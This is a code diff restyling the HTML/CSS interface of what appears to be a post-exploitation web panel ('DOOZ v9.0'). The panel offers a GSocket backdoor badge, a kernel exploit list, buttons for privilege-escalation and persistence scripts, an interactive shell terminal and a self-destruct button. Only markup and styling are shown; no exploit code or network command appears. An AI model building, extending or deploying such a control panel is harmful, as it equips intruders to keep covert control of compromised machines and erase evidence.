@@ -1,223 +1,313 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DZ</title>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-:root{--bg:#030305;--panel:#0a0b0f;--glass:rgba(255,255,255,0.015);--glass2:rgba(255,255,255,0.03);--border:rgba(255,255,255,0.04);--border2:rgba(255,255,255,0.08);--text:#8a8f9a;--text2:#4a4e5a;--gold:#c9a227;--gold2:#a68520;--green:#10b981;--red:#ef4444;--blue:#3b82f6;--glow:rgba(201,162,39,0.08)}
-html,body{height:100%}
-body{font-family:'JetBrains Mono',monospace;background:var(--bg);color:var(--text);font-size:11px;overflow:hidden}
-body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent 0px,transparent 2px,rgba(0,0,0,0.15) 2px,rgba(0,0,0,0.15) 4px);pointer-events:none;z-index:10000}
-body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 30% 0%,rgba(201,162,39,0.03),transparent 50%),radial-gradient(ellipse at 70% 100%,rgba(16,185,129,0.02),transparent 50%);pointer-events:none}
-.app{display:grid;grid-template-columns:200px 1fr 280px;grid-template-rows:50px 1fr;height:100vh;gap:1px;background:var(--border)}
-header{grid-column:1/-1;background:var(--panel);display:flex;align-items:center;justify-content:space-between;padding:0 20px;border-bottom:1px solid var(--border)}
-.logo{font-size:16px;font-weight:600;color:var(--gold);letter-spacing:4px}
-.logo span{font-size:9px;color:var(--text2);font-weight:300;margin-left:8px;letter-spacing:1px}
-.hdr-r{display:flex;align-items:center;gap:16px}
-.gs-badge{display:flex;align-items:center;gap:6px;background:var(--glass2);border:1px solid var(--border2);padding:6px 12px;border-radius:4px;font-size:9px}
-.gs-badge i{width:6px;height:6px;background:var(--green);border-radius:50%;box-shadow:0 0 10px var(--green);animation:pulse 2s infinite}
-@keyframes pulse{50%{opacity:.4}}
-.gs-key{color:var(--gold);font-weight:500}
-aside{background:var(--panel);padding:12px;overflow-y:auto}
-nav a{display:flex;align-items:center;gap:10px;padding:10px 12px;color:var(--text2);text-decoration:none;border-radius:4px;margin-bottom:2px;transition:all .15s;font-size:10px;letter-spacing:1px;text-transform:uppercase}
-nav a:hover{background:var(--glass);color:var(--text)}
-nav a.on{background:linear-gradient(90deg,var(--glow),transparent);color:var(--gold);border-left:2px solid var(--gold)}
-nav a svg{width:14px;height:14px;opacity:.5}
-nav a.on svg{opacity:1}
-.nav-sep{height:1px;background:var(--border);margin:12px 0}
-main{background:var(--bg);padding:16px;overflow-y:auto}
-.panel{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:16px;margin-bottom:12px;position:relative}
-.panel::before{content:'';position:absolute;top:0;left:20px;right:20px;height:1px;background:linear-gradient(90deg,transparent,var(--gold),transparent);opacity:.2}
-.panel h2{font-size:9px;font-weight:500;color:var(--text2);letter-spacing:2px;text-transform:uppercase;margin-bottom:14px;display:flex;align-items:center;gap:8px}
-.panel h2::before{content:'';width:4px;height:4px;background:var(--gold);border-radius:1px}
-.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
-.stat{background:var(--glass);border:1px solid var(--border);border-radius:4px;padding:10px}
-.stat-l{font-size:8px;color:var(--text2);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
-.stat-v{font-size:11px;color:var(--text);word-break:break-all}
-.exp{display:flex;align-items:center;padding:12px;background:var(--glass);border:1px solid var(--border);border-radius:4px;margin-bottom:6px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
-.exp:hover{border-color:var(--gold);transform:translateX(4px)}
-.exp::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:var(--gold);opacity:0;transition:opacity .2s}
-.exp:hover::before{opacity:1}
-.exp-cve{font-size:10px;font-weight:600;width:120px;color:var(--gold)}
-.exp-nm{flex:1;color:var(--text2);font-size:9px}
-.exp-rt{font-size:10px;font-weight:600;width:40px;text-align:right}
-.exp-bar{width:80px;height:3px;background:var(--glass2);border-radius:2px;margin-left:12px;overflow:hidden}
-.exp-bar i{display:block;height:100%;border-radius:2px}
-.term{background:#000;border:1px solid var(--border);border-radius:4px;font-size:10px;height:100%;min-height:200px;overflow:hidden;display:flex;flex-direction:column}
-.term-head{background:var(--glass);padding:8px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;font-size:9px;color:var(--text2)}
-.term-dot{width:8px;height:8px;border-radius:50%;background:var(--red)}
-.term-dot:nth-child(2){background:var(--gold)}
-.term-dot:nth-child(3){background:var(--green)}
-.term-body{flex:1;padding:12px;overflow-y:auto;line-height:1.6}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-font-smoothing:antialiased}
+:root{--bg:#030304;--panel:#08090c;--card:#0c0d12;--glass:rgba(255,255,255,0.01);--glass2:rgba(255,255,255,0.025);--border:rgba(255,255,255,0.035);--border2:rgba(255,255,255,0.06);--text:#9ca3af;--text2:#4b5563;--text3:#374151;--gold:#d4a012;--gold2:#b8860b;--goldGlow:rgba(212,160,18,0.1);--green:#10b981;--greenGlow:rgba(16,185,129,0.15);--red:#ef4444;--blue:#3b82f6;--cyan:#06b6d4}
+html,body{height:100%;overflow:hidden}
+body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);font-size:12px}
+body::before{content:'';position:fixed;inset:0;background:url("data:image/svg+xml,%3Csvg viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");opacity:.015;pointer-events:none;z-index:10000}
+body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 20% 20%,rgba(212,160,18,0.03),transparent 50%),radial-gradient(ellipse at 80% 80%,rgba(16,185,129,0.02),transparent 50%);pointer-events:none}
+
+.app{display:grid;grid-template-columns:56px 1fr 300px;grid-template-rows:1fr;height:100vh}
+.sidebar{background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column;align-items:center;padding:16px 0;gap:4px}
+.sidebar .logo{width:32px;height:32px;background:linear-gradient(135deg,var(--gold),var(--gold2));border-radius:8px;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono';font-weight:600;font-size:11px;color:#000;margin-bottom:16px}
+.nav-item{width:40px;height:40px;display:flex;align-items:center;justify-content:center;border-radius:10px;cursor:pointer;transition:all .15s;color:var(--text2);position:relative}
+.nav-item:hover{background:var(--glass2);color:var(--text)}
+.nav-item.on{background:var(--goldGlow);color:var(--gold)}
+.nav-item.on::before{content:'';position:absolute;left:0;top:50%;transform:translateY(-50%);width:2px;height:20px;background:var(--gold);border-radius:0 2px 2px 0}
+.nav-item svg{width:18px;height:18px}
+.nav-sep{width:24px;height:1px;background:var(--border);margin:8px 0}
+.nav-bottom{margin-top:auto}
+
+main{background:var(--bg);overflow-y:auto;padding:20px}
+main::-webkit-scrollbar{width:6px}
+main::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
+
+.header{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
+.header h1{font-size:18px;font-weight:500;color:var(--text)}
+.header h1 span{color:var(--gold)}
+.badge{display:inline-flex;align-items:center;gap:6px;background:var(--greenGlow);border:1px solid rgba(16,185,129,0.2);padding:6px 12px;border-radius:6px;font-size:10px;color:var(--green)}
+.badge i{width:6px;height:6px;background:var(--green);border-radius:50%;animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(16,185,129,0.4)}50%{opacity:.6;box-shadow:0 0 0 4px rgba(16,185,129,0)}}
+
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:16px}
+.grid-2{grid-template-columns:repeat(2,1fr)}
+.grid-3{grid-template-columns:repeat(3,1fr)}
+.card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(212,160,18,0.2),transparent)}
+.card.full{grid-column:1/-1}
+.card.span-2{grid-column:span 2}
+.card.span-3{grid-column:span 3}
+.card-title{font-size:10px;font-weight:500;color:var(--text2);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.card-title svg{width:14px;height:14px;opacity:.5}
+.card-value{font-family:'JetBrains Mono';font-size:20px;font-weight:500;color:var(--text)}
+.card-value.sm{font-size:13px}
+.card-sub{font-size:10px;color:var(--text2);margin-top:4px}
+
+.stat-row{display:flex;gap:16px}
+.stat-item{flex:1}
+.stat-label{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
+.stat-val{font-family:'JetBrains Mono';font-size:12px;color:var(--text)}
+
+.term{background:#000;border:1px solid var(--border);border-radius:8px;overflow:hidden;display:flex;flex-direction:column}
+.term-bar{background:linear-gradient(180deg,#1a1a1a,#111);padding:8px 12px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border)}
+.term-dots{display:flex;gap:6px}
+.term-dots span{width:10px;height:10px;border-radius:50%;background:#333}
+.term-dots span:nth-child(1){background:#ff5f57}
+.term-dots span:nth-child(2){background:#ffbd2e}
+.term-dots span:nth-child(3){background:#28ca42}
+.term-title{margin-left:auto;font-family:'JetBrains Mono';font-size:10px;color:var(--text2)}
+.term-body{font-family:'JetBrains Mono';font-size:11px;padding:12px;flex:1;overflow-y:auto;min-height:150px;max-height:300px;line-height:1.6}
 .term-body::-webkit-scrollbar{width:4px}
 .term-body::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
-.ln{opacity:0;animation:fadeIn .2s forwards;padding-left:16px;position:relative;margin:1px 0}
-.ln::before{content:'›';position:absolute;left:0;color:var(--gold);opacity:.4}
-.ln.cmd{color:var(--gold)}
-.ln.cmd::before{content:'$'}
-.ln.ok{color:var(--green)}
-.ln.ok::before{content:'✓';color:var(--green)}
-.ln.err{color:var(--red)}
-.ln.err::before{content:'✗';color:var(--red)}
+.ln{margin:1px 0;padding-left:14px;position:relative;opacity:0;animation:fadeIn .15s forwards}
+.ln::before{content:'›';position:absolute;left:0;color:var(--text3)}
+.ln.cmd{color:var(--gold)}.ln.cmd::before{content:'$';color:var(--gold)}
+.ln.ok{color:var(--green)}.ln.ok::before{content:'✓';color:var(--green)}
+.ln.err{color:var(--red)}.ln.err::before{content:'!';color:var(--red)}
 .ln.info{color:var(--text2)}
 @keyframes fadeIn{to{opacity:1}}
-.term-input{display:flex;border-top:1px solid var(--border);background:var(--glass)}
-.term-input input{flex:1;background:transparent;border:none;color:var(--text);padding:10px 12px;font-family:inherit;font-size:10px;outline:none}
-.term-input button{background:var(--gold);color:#000;border:none;padding:0 16px;font-family:inherit;font-size:9px;font-weight:600;cursor:pointer;letter-spacing:1px}
-.sidebar{background:var(--panel);padding:12px;overflow-y:auto;border-left:1px solid var(--border)}
-.fm{height:100%;display:flex;flex-direction:column}
-.fm-head{padding-bottom:10px;border-bottom:1px solid var(--border);margin-bottom:10px}
-.fm-path{font-size:9px;color:var(--text2);display:flex;flex-wrap:wrap;gap:4px}
+.term-input{display:flex;background:#0a0a0a;border-top:1px solid var(--border)}
+.term-input input{flex:1;background:transparent;border:none;padding:10px 12px;color:var(--text);font-family:'JetBrains Mono';font-size:11px;outline:none}
+.term-input input::placeholder{color:var(--text3)}
+.term-input button{background:var(--gold);color:#000;border:none;padding:0 16px;font-family:'JetBrains Mono';font-size:10px;font-weight:600;cursor:pointer}
+
+.exp-list{max-height:280px;overflow-y:auto}
+.exp{display:flex;align-items:center;padding:12px;background:var(--glass);border:1px solid var(--border);border-radius:8px;margin-bottom:6px;cursor:pointer;transition:all .2s}
+.exp:hover{border-color:var(--gold);background:var(--goldGlow);transform:translateX(4px)}
+.exp-cve{font-family:'JetBrains Mono';font-size:11px;font-weight:600;width:130px;color:var(--gold)}
+.exp-name{flex:1;font-size:11px;color:var(--text2)}
+.exp-rate{font-family:'JetBrains Mono';font-size:11px;font-weight:600;width:45px;text-align:right}
+.exp-bar{width:80px;height:4px;background:var(--glass2);border-radius:2px;margin-left:12px;overflow:hidden}
+.exp-bar i{display:block;height:100%;border-radius:2px;transition:width .5s}
+
+.progress{height:3px;background:var(--glass2);border-radius:2px;overflow:hidden;margin:8px 0}
+.progress i{height:100%;background:linear-gradient(90deg,var(--gold),var(--green));border-radius:2px;transition:width .3s}
+
+.btn{background:linear-gradient(135deg,var(--gold),var(--gold2));color:#000;border:none;padding:10px 20px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;transition:all .2s;font-family:'Inter'}
+.btn:hover{box-shadow:0 4px 20px var(--goldGlow);transform:translateY(-1px)}
+.btn-ghost{background:var(--glass2);border:1px solid var(--border);color:var(--text)}
+.btn-ghost:hover{border-color:var(--gold);color:var(--gold)}
+.btn-red{background:linear-gradient(135deg,var(--red),#dc2626);color:#fff}
+.btn-sm{padding:6px 12px;font-size:10px}
+.btns{display:flex;gap:8px;flex-wrap:wrap}
+
+.qs{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px}
+.qs span{padding:8px 14px;background:var(--glass);border:1px solid var(--border);border-radius:6px;font-size:10px;color:var(--text2);cursor:pointer;transition:all .15s;font-family:'JetBrains Mono'}
+.qs span:hover{border-color:var(--gold);color:var(--gold);background:var(--goldGlow)}
+
+.page{display:none}.page.on{display:block}
+
+/* Right Sidebar - File Manager */
+.rsb{background:var(--panel);border-left:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
+.rsb-head{padding:16px;border-bottom:1px solid var(--border)}
+.rsb-head h3{font-size:10px;font-weight:500;color:var(--text2);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:10px}
+.fm-path{font-family:'JetBrains Mono';font-size:10px;display:flex;flex-wrap:wrap;gap:4px;color:var(--text2)}
 .fm-path a{color:var(--gold);text-decoration:none}
 .fm-path a:hover{text-decoration:underline}
-.fm-list{flex:1;overflow-y:auto}
-.fm-item{display:flex;align-items:center;padding:8px;border-radius:4px;cursor:pointer;transition:all .1s;border:1px solid transparent}
-.fm-item:hover{background:var(--glass);border-color:var(--border)}
-.fm-item.sel{background:var(--glow);border-color:var(--gold)}
-.fm-icon{width:28px;height:28px;display:flex;align-items:center;justify-content:center;background:var(--glass);border-radius:4px;margin-right:10px;font-size:12px}
-.fm-icon.dir{background:rgba(201,162,39,0.1);color:var(--gold)}
+.rsb-body{flex:1;overflow-y:auto;padding:8px}
+.rsb-body::-webkit-scrollbar{width:4px}
+.rsb-body::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.fm-item{display:flex;align-items:center;padding:10px;border-radius:8px;cursor:pointer;transition:all .1s;margin-bottom:2px}
+.fm-item:hover{background:var(--glass2)}
+.fm-item.sel{background:var(--goldGlow);border:1px solid rgba(212,160,18,0.2)}
+.fm-icon{width:32px;height:32px;display:flex;align-items:center;justify-content:center;background:var(--glass2);border-radius:6px;margin-right:10px;font-size:14px}
+.fm-icon.dir{background:rgba(212,160,18,0.1)}
 .fm-info{flex:1;min-width:0}
-.fm-name{font-size:10px;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.fm-meta{font-size:8px;color:var(--text2);margin-top:2px}
-.fm-preview{background:var(--glass);border:1px solid var(--border);border-radius:4px;padding:10px;margin-top:10px;max-height:150px;overflow:auto;font-size:9px;white-space:pre-wrap;word-break:break-all}
-.progress{height:2px;background:var(--glass2);border-radius:1px;overflow:hidden;margin:8px 0}
-.progress i{height:100%;background:linear-gradient(90deg,var(--gold),var(--green));transition:width .3s}
-.scan-log{max-height:120px;overflow-y:auto;margin-top:8px}
-.btn{background:linear-gradient(135deg,var(--gold),var(--gold2));color:#000;border:none;padding:8px 16px;border-radius:4px;font-family:inherit;font-size:9px;font-weight:600;cursor:pointer;letter-spacing:1px;transition:all .2s}
-.btn:hover{box-shadow:0 0 20px var(--glow)}
-.btn-sm{padding:6px 10px;font-size:8px}
-.btn-g{background:var(--glass);border:1px solid var(--border);color:var(--text)}
-.btn-r{background:linear-gradient(135deg,var(--red),#c41d3a);color:#fff}
-.qs{display:flex;flex-wrap:wrap;gap:4px}
-.qs span{padding:6px 10px;background:var(--glass);border:1px solid var(--border);border-radius:3px;font-size:9px;color:var(--text2);cursor:pointer;transition:all .15s}
-.qs span:hover{border-color:var(--gold);color:var(--gold)}
-.page{display:none}.page.on{display:block}
-.acts{display:flex;gap:6px;margin-top:12px}
-.key-box{background:#000;border:1px solid var(--border);border-radius:4px;padding:12px;font-size:9px;color:var(--gold);word-break:break-all;cursor:pointer;transition:all .2s}
-.key-box:hover{border-color:var(--gold)}
-.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-@media(max-width:1000px){.app{grid-template-columns:1fr}.sidebar{display:none}aside{position:fixed;left:-200px}}
+.fm-name{font-size:11px;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.fm-meta{font-family:'JetBrains Mono';font-size:9px;color:var(--text3);margin-top:2px}
+.fm-preview{background:var(--card);border:1px solid var(--border);border-radius:8px;margin:8px;padding:12px;max-height:180px;overflow:auto;font-family:'JetBrains Mono';font-size:10px;line-height:1.5;white-space:pre-wrap;word-break:break-all;color:var(--text2)}
+
+.key-box{background:#000;border:1px solid var(--border);border-radius:6px;padding:14px;font-family:'JetBrains Mono';font-size:11px;color:var(--gold);word-break:break-all;cursor:pointer;transition:all .2s}
+.key-box:hover{border-color:var(--gold);background:var(--goldGlow)}
+
+.realtime{position:absolute;top:16px;right:16px;display:flex;align-items:center;gap:6px;font-size:9px;color:var(--green)}
+.realtime i{width:5px;height:5px;background:var(--green);border-radius:50%;animation:pulse 1s infinite}
+
+.live-stats{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
+.live-stat{background:var(--glass);border-radius:6px;padding:10px}
+.live-stat-label{font-size:9px;color:var(--text3);text-transform:uppercase;margin-bottom:4px}
+.live-stat-value{font-family:'JetBrains Mono';font-size:14px;color:var(--text)}
+.live-stat-bar{height:3px;background:var(--glass2);border-radius:2px;margin-top:6px;overflow:hidden}
+.live-stat-bar i{height:100%;border-radius:2px;transition:width .5s}
 </style></head>
 <body>
 <div class="app">
-<header>
-<div class="logo">DOOZ<span>v9.0</span></div>
-<div class="hdr-r">
-<div class="gs-badge"><i></i><span>GSOCKET</span><span class="gs-key" id="gskey">%s</span></div>
+<nav class="sidebar">
+<div class="logo">DZ</div>
+<div class="nav-item on" data-p="dash" title="Dashboard"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="9"/><rect x="14" y="3" width="7" height="5"/><rect x="14" y="12" width="7" height="9"/><rect x="3" y="16" width="7" height="5"/></svg></div>
+<div class="nav-item" data-p="exp" title="Exploits"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg></div>
+<div class="nav-item" data-p="scr" title="Scripts"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg></div>
+<div class="nav-item" data-p="term" title="Terminal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div>
+<div class="nav-sep"></div>
+<div class="nav-item" data-p="proc" title="Processes"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
+<div class="nav-item" data-p="net" title="Network"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg></div>
+<div class="nav-bottom">
+<div class="nav-sep"></div>
+<div class="nav-item" data-p="cfg" title="Config"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83-2.83l.06-.06a1.65 1.65 0 00.33-1.82 1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06a1.65 1.65 0 001.82.33H9a1.65 1.65 0 001-1.51V3a2 2 0 114 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06a1.65 1.65 0 00-.33 1.82V9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z"/></svg></div>
+<div class="nav-item" onclick="nuke()" title="Destruct" style="color:var(--red)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg></div>
 </div>
-</header>
-<aside>
-<nav>
-<a class="on" data-p="dash"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>Dashboard</a>
-<a data-p="exp"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>Exploits</a>
-<a data-p="scr"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6M16 13H8M16 17H8M10 9H8"/></svg>Scripts</a>
-<a data-p="term"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Terminal</a>
-<div class="nav-sep"></div>
-<a data-p="proc"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>Processes</a>
-<a data-p="net"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>Network</a>
-<div class="nav-sep"></div>
-<a data-p="cfg"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-2 2 2 2 0 01-2-2v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83 0 2 2 0 010-2.83l.06-.06a1.65 1.65 0 00.33-1.82 1.65 1.65 0 00-1.51-1H3a2 2 0 01-2-2 2 2 0 012-2h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 010-2.83 2 2 0 012.83 0l.06.06a1.65 1.65 0 001.82.33H9a1.65 1.65 0 001-1.51V3a2 2 0 012-2 2 2 0 012 2v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 0 2 2 0 010 2.83l-.06.06a1.65 1.65 0 00-.33 1.82V9a1.65 1.65 0 001.51 1H21a2 2 0 012 2 2 2 0 01-2 2h-.09a1.65 1.65 0 00-1.51 1z"/></svg>Config</a>
 </nav>
-<div style="margin-top:auto;padding-top:12px;border-top:1px solid var(--border)">
-<button class="btn btn-r btn-sm" style="width:100%" onclick="nuke()">DESTRUCT</button>
-</div>
-</aside>
+
 <main>
 <div id="p-dash" class="page on">
-<div class="panel"><h2>System Information</h2><div class="stats" id="sys"></div></div>
-<div class="panel"><h2>Exploit Scanner</h2><div id="scan"></div></div>
-<div class="panel"><h2>Quick Actions</h2>
-<div class="qs"><span onclick="nav('exp')">⚡ EXPLOITS</span><span onclick="nav('scr')">◎ SCRIPTS</span><span onclick="nav('term')">▣ TERMINAL</span><span onclick="nav('proc')">◈ PROCESSES</span><span onclick="nav('net')">◉ NETWORK</span><span onclick="pull()">↻ UPDATE</span></div>
+<div class="header"><h1>System <span>Overview</span></h1><div class="badge"><i></i>GSSocket Active</div></div>
+<div class="grid">
+<div class="card"><div class="card-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/></svg>Kernel</div><div class="card-value" id="s_kernel">-</div></div>
+<div class="card"><div class="card-title">User</div><div class="card-value" id="s_user">-</div><div class="card-sub" id="s_uid"></div></div>
+<div class="card"><div class="card-title">Uptime</div><div class="card-value sm" id="s_uptime">-</div></div>
+<div class="card"><div class="card-title">Memory</div><div class="card-value sm" id="s_mem">-</div></div>
 </div>
+<div class="grid grid-2">
+<div class="card" style="position:relative"><div class="realtime"><i></i>LIVE</div><div class="card-title">System Resources</div><div class="live-stats" id="live"></div></div>
+<div class="card"><div class="card-title">Quick Actions</div><div class="qs"><span onclick="nav('exp')">⚡ Exploit Scan</span><span onclick="nav('term')">▸ Terminal</span><span onclick="nav('proc')">◈ Processes</span><span onclick="nav('net')">◉ Network</span><span onclick="pull()">↻ Update</span></div></div>
 </div>
-<div id="p-exp" class="page"><div class="panel" style="height:calc(100vh - 120px)"><h2>Kernel Exploits</h2><div id="expl" style="overflow-y:auto;height:calc(100% - 40px)"></div></div></div>
+<div class="card full"><div class="card-title">Vulnerability Scanner</div><div id="scan"></div></div>
+</div>
+
+<div id="p-exp" class="page">
+<div class="header"><h1>Kernel <span>Exploits</span></h1></div>
+<div class="card"><div class="exp-list" id="expl"></div></div>
+</div>
+
 <div id="p-scr" class="page">
-<div class="panel"><h2>Execute Script</h2>
-<div class="qs" style="margin-bottom:12px"><span onclick="rs('scripts/sysinfo.sh')">sysinfo</span><span onclick="rs('scripts/recon.sh')">recon</span><span onclick="rs('scripts/privesc.sh')">privesc</span><span onclick="rs('scripts/persist.sh')">persist</span></div>
-<div style="display:flex;gap:8px"><input id="sp" style="flex:1;background:var(--glass);border:1px solid var(--border);color:var(--text);padding:10px;border-radius:4px;font-family:inherit" placeholder="scripts/example.sh"><button class="btn" onclick="rs($('sp').value)">RUN</button></div>
+<div class="header"><h1>Script <span>Execution</span></h1></div>
+<div class="card"><div class="qs"><span onclick="rs('scripts/sysinfo.sh')">sysinfo</span><span onclick="rs('scripts/recon.sh')">recon</span><span onclick="rs('scripts/privesc.sh')">privesc</span><span onclick="rs('scripts/persist.sh')">persist</span></div><div style="display:flex;gap:8px;margin-top:12px"><input id="sp" style="flex:1;background:var(--glass);border:1px solid var(--border);padding:12px;border-radius:6px;color:var(--text);font-family:'JetBrains Mono';font-size:11px;outline:none" placeholder="scripts/example.sh"><button class="btn" onclick="rs($('sp').value)">Execute</button></div></div>
+<div class="card" style="margin-top:12px"><div class="term" style="height:350px"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">output</div></div><div class="term-body" id="so" style="max-height:300px"></div></div></div>
 </div>
-<div class="panel" style="height:calc(100vh - 240px)"><h2>Output</h2><div class="term" style="height:calc(100% - 30px)"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><span style="margin-left:auto">script output</span></div><div class="term-body" id="so"></div></div></div>
+
+<div id="p-term" class="page">
+<div class="header"><h1>Shell <span>Terminal</span></h1></div>
+<div class="card"><div class="term" style="height:calc(100vh - 180px)"><div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">bash</div></div><div class="term-body" id="to" style="max-height:calc(100vh - 280px)"></div><div class="term-input"><input id="tc" placeholder="Enter command..." onkeydown="event.key==='Enter'&&rc()"><button onclick="rc()">RUN</button></div></div></div>
 </div>
